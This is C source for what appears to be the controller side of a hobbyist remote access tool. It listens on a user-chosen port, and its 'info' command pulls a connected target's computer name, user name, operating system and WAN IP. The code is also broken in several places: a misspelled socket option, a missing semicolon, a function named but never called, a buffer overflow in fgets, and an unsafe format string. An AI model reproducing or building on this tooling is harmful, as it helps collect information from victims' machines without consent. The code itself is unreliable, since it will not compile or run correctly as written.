#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

struct sockaddr_in serv_addr, cli_addr;
int sock_fd=0, newsock_fd=0, clilen=0, n=0;

void ErrorMessage(const char *msg) {
    perror(msg);
}
int Shell() {
    char command[1024];
    char help[1024] = "help";
    char close[1024] = "close";
    char info[1024] = "info";
    char clear[1024] = "clear";
    char HELP[1024] = "\n\n     [ HELP MENU ]\n     [ Help - Print this menu ]\n    [ Close - Close Connection ]\n      [ Info - Retrieve target infos ]\n      [ Clear - Clear the Terminal ]\n    [ HELP MENU ]\n\n";

    char COMPUTER[1024];
    char USER[1024];
    char OS[1024];
    char WANIP[1024];
    
    char *p = getenv("USER");
    sleep(1);

    printf("    [>>] Shell Session Opened !\n");

    while(1) {
        printf("    %s@%s:~$ ", p, inet_ntoa(cli_addr.sin_addr));
        bzero(command, 1024);
        fgets(command, 1024, stdin);

        if (strncmp(command, help, strlen(help)) == 0) {
            printf(HELP);
        }
        else if (strncmp(command, close, strlen(close)) == 0) {
            n= write(newsock_fd, close, strlen(close));
            printf("    [>>] Closing session.");
            exit(1);
        }
        else if (strncmp(command, info, strlen(info)) == 0) {
            bzero(command, 1024);
            printf("    [>>] Waiting for Info. \n");
            if (n<0) {
                ErrorMessage(" [!!] Error Writing To Socket !\n");
            }

            n = read(newsock_fd, COMPUTER, 1024);
            n = read(newsock_fd, USER,1024);
            n = read(newsock_fd, OS, 1024);
            n = read(newsock_fd, WANIP, 1024);

            printf("    Computer Name -- %s\n", COMPUTER);
            printf("    User Name -- %s\n", USER);
            printf("    Operating Sys -- %s\n", OS);
            printf("    WAN IP -- %s\n", WANIP);
        }
        else if (strncmp(command, clear, strlen(clear)) == 0) {
            system("clear");
        }

        else {
            printf("    [!!] Invalid Command !\n");
        }
    }
}


int Server() {
    char ports[1024];
    int pid;
    int optval = 1;
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    int i;

    if (setsockopt(sock_fd, SOL_SOCKET, SO_REFUSEADDR, &optval, sizeof(optval)) <0) {
        printf("    [!!] Error setting TCP Socket Options!\n")
        return 1;
    }

    if (sock_fd<0) {
        printf("    [!!] Error Opening Socket Handle !\n");
    }
    
    bzero((char *) &serv_addr, sizeof(serv_addr));
    printf("    [>>] Input the Port to Accept Connections On: ");
    fgets(ports, BUFSIZ, stdin);

    int port = atoi(ports);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock_fd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) <0) {
        ErrorMessage("  [!!] Error Binding !\n");
    }

    listen(sock_fd, 5);
    printf("    [>>] Waiting for Incoming Connections...\n");

    clilen = sizeof(cli_addr);
    newsock_fd = accept(sock_fd, (struct sockaddr *) &cli_addr, &clilen);

    if (newsock_fd<0) {
        printf("    [!!] Error Accepting Connection !\n");
    }

    printf("    [>>] Connection From %s!\n", inet_ntoa(cli_addr.sin_addr));
    printf("    [>>] Beggining Shell Session !\n");
    Shell;
    return 0;
}

int main(void) {
    Server();
}